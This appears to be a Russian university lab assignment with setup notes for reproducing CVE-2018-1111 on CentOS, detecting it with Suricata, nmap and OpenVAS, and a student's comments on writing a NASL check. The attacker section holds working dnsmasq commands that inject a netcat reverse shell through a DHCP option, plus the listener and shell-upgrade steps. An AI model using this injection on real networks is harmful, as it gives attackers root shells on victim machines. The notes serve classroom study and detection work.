Добрый день.
Высылаю задание к лабораторной работе № 3.
Исследуемые в лабораторной работе уязвимости не должны повторяться.
Срок сдачи: 5 и 6 ноября.

Жуковский Е.В.

---------------------------------------------

https://docs.google.com/spreadsheets/d/193NVCTgpqTcDABO0SGPVihmtUd6hEnBCumIEcja4ZTA/edit?usp=sharing

---------------------------------------------

CVE 2018-1111 Tenable WAS-Scanner 7.4.1708 - Remote Command Execution https://www.exploit-db.com/exploits/45345/

http://www.pcds.fi/downloads/iso/redhatbased/centos/centos7X/rel71708/centos.74.html
CentOS-7-i386-LiveKDE-1708
https://eax.me/centos-packages/
https://unix.stackexchange.com/questions/393762/how-to-manually-update-nmaps-ncat-on-centos-7/393763

---------------------------------------------

//CentOS 7:1408

https://drive.google.com/drive/folders/13yTz7_SAWV-FGdrAleyUwF0_B7lzdjFb

---------------------------------------------
// Attacker machine

killall dnsmasq

ifconfig ens33 192.168.44.2 && ifconfig ens33 up

dnsmasq --interface=ens33 --bind-interfaces --except-interface=lo --dhcp-range=192.168.44.21,192.168.44.25,1h --conf-file=/dev/null --dhcp-option=6,192.168.44.2 --dhcp-option=3,192.168.44.2 --dhcp-option="252,x'&/usr/bin/nc -nv 192.168.44.2 5555 -e /bin/bash #"

ifconfig docker0 172.17.0.1 && ifconfig docker0 up
dnsmasq --interface=docker0 --bind-interfaces --except-interface=lo --dhcp-range=172.17.0.21,172.17.0.25,1h --conf-file=/dev/null --dhcp-option=6,172.17.0.1 --dhcp-option=3,172.17.0.1 --dhcp-option="252,x'&/usr/bin/nc -nv 172.17.0.1 5555 -e /bin/bash #"

//End Attacker machine


//Other terminal

nc -lvp 5555

id
hostid
python -c 'import pty; pty.spawn("/bin/sh")'

cd /home/liveuser
touch attackwas.txt
ls -la

// End Other terminal

---------------------------------------------

// Victim machine

liveuser:liveuser
rootuser:rootuser

//# su - username
//root
su - 

ip addr show

nmcli con show

nmcli con up "ens33"

---------------------------------------------

//Install docker in Ubuntu
//https://askubuntu.com/questions/938700/how-do-i-install-docker-on-ubuntu-16-04-lts

sudo apt-get install -y  docker.io

sudo apt-get install -y docker-compose


// Install GUI on CentOS
https://www.itzgeek.com/how-tos/linux/centos-how-tos/install-gnome-gui-on-centos-7-rhel-7.html

yum groupinstall -y "GNOME Desktop" "Graphical Administration Tools"

ln -sf /lib/systemd/system/runlevel5.target /etc/systemd/system/default.target

reboot

---------------------------------------------
///


// Install docker CentOS
https://www.8host.com/blog/nachalnaya-nastrojka-servera-centos-7/
https://www.8host.com/blog/ustanovka-i-ispolzovanie-docker-v-centos-7/
https://wiki.merionet.ru/servernye-resheniya/9/kak-rabotat-s-dockerfile/
https://hub.docker.com/_/centos/


---------------------------------------------

// NMap (https://nmap.org/download.html)
http://cryptoworld.su/%D0%BF%D1%80%D0%B0%D0%BA%D1%82%D0%B8%D0%BA%D0%B0-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-%D1%81%D0%BA%D0%B0%D0%BD%D0%B5%D1%80%D0%B0-%D1%83%D1%8F%D0%B7%D0%B2/
http://thesprawl.org/research/writing-nse-scripts-for-vulnerability-scanning/

su -
rpm -vhU https://nmap.org/dist/nmap-7.70-1.x86_64.rpm

/*
wget https://svn.nmap.org/nmap/scripts/broadcast-dhcp-discover.nse
cp broadcast-dhcp-discover.nse /usr/share/nmap/scripts/broadcast-dhcp-discover11.nse
nmap --script-updatedb
*/

ifconfig ens33 192.168.44.10 && ifconfig ens33 up
nmap --script broadcast-dhcp-discover -e ens33

---------------------------------------------

// Suricata

yum install -y epel-release
yum install -y suricata

cd /etc/suricata/

// Add in /rules/myrule.rules
// Add in /suricata.yaml 
//  default-rule-path: /etc/suricata/rules
//  rule-files:
//  - myrule.rules

suricata -c /etc/suricata/suricata.yaml -i ens33 --init-errors-fatal

sudo tail -f /var/log/suricata/fast.log

---------------------------------------------

// Kernel mode

//Check verison kernel
uname -a

//Install tools for developing kernel (CentOS)
yum install -y kernel-headers
yum install -y kernel-devel


// Create directory
cd /
mkdir driver

//Copy Makefile from /kernel_module
Create Makefile and mymodule.c

//Build module 
make

//Install module
make install

//See current log
make status

//Delete kernel module
make delete

//Delete object files - clean folder 
make clean

---------------------------------------------

//Install OpenVAS for Ubuntu
https://hackertarget.com/openvas-9-install-ubuntu-1604/ Getting Started with OpenVAS 9
https://olivermarshall.net/how-to-install-openvas-9-on-ubuntu-16/

//Run script myscript.nasl
move in /var/lib/openvas/plugins

sudo openvas-nasl -X -d -t 192.168.125.148 -i /var/lib/openvas/plugins/ /var/lib/openvas/plugins/myscript.nasl -T openvas_report.txt

cat openvas_report.txt

//Igor's Comments 

Ты не курсе, как указать в openvas-nasl параметры для аутентификации?
openvas-nasl -X -d -t 192.168.70.25 -i /var/lib/openvas/plugins/ /var/lib/openvas/plugins/CVE2018_1111.nasl -T openvas_report.txt
Мы указываем -X для использования аутентификации на сканируемой ОС, но юзер/пароль не указываем, поэтому скан не работает

Для вебки надо перейти сверху в Configuration
Там credentials
На звездочку слева сверху нажимаешь, создаешь параметры для ssh
Соответственно должен быть ssh на ОС, которую сканишь
Потом при сканировании можно будет эти креды выбрать
И он при таком скане херову кучу уязвимостей нашел

myscript.nasl
Типо release = get_kb_item("ssh/login/release"); возвращает NULL
ssh/login/release - это поле в knowledge base

openvas-nasl -X -d -t 192.168.183.151 -k Secret/SSH/login=root -k Secret/SSH/password=rootuser -i /var/lib/openvas/plugins/ /var/lib/openvas/plugins/bos3.nasl -T openvas_report.txt

Я так и не полнял, почему тот не работал
Там кароч прикол такой, что ты можешь в script_dependencies указать скрипты, которые надо запустить перед твоим
Скрипты могут общаться между собой через базу данных
В твоем скрипте в script_dependencies указан скрипт, который достает версию ОС и установленные пакеты с их версиями, кладет их в базу 
Потом твой скрипт просто достает их базы версию ОС, чекает, что CentOS7
Ну потом достает пакеты и чекает, что есть определенные пакеты определенных версий
Ищет уязвимые
Так вот он почему то достает из базы NULL всегда
И судя по ощущениям скрипт из script_dependencies вообще не запускается, так как я его пробовал отдельно запускать и он работает несколько секунд
А так запускаешь твой, и он моментально результат дает, будто предыдущий вообще не запускался
В конфиге есть параметр, который отвечает за то, что надо запускать скрипты-зависимости, но этот параметр стоит на вкл
//end Igor's Comments

---------------------------------------------

//Notes

//Connect via ssh
putty.exe -ssh root@192.168.125.140 -pw rootuser

//Free cashe
apt clean 

//sudo apt-get -f install -y
